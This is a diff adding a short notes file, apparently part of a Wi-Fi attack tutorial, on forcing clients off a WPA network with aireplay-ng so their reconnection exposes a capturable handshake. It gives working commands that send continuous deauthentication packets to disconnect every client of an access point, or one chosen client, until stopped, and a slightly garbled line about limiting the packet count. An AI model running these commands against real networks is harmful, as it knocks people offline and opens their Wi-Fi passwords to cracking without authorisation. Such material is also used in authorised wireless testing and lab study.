@@ -1,0 +1,13 @@
+In order to capture the handshake packets clients will need to be deauthenticated. When clients reconnect they will resend a
+handshake request.
+This command sends continuous deauthentication packets to the access point, disconnecting all connected clients until manually stopped.
+
+aireplay-ng --deauth 0 -a $ap_mac wlan0mon
+
+--deauth 0 can be changed to --deauth and it will only send 5 deauth packets
+
+This will only deauthenitcate the specified client. This option is obviously less intrusive to the network
+
+aireplay-ng --deauth 0 -a $ap_mac -c $client_mac wlan0mon
+
+Once a client has reconnected after a deauthentication the airodump output will show [ WPA handshake: $ap_mac]
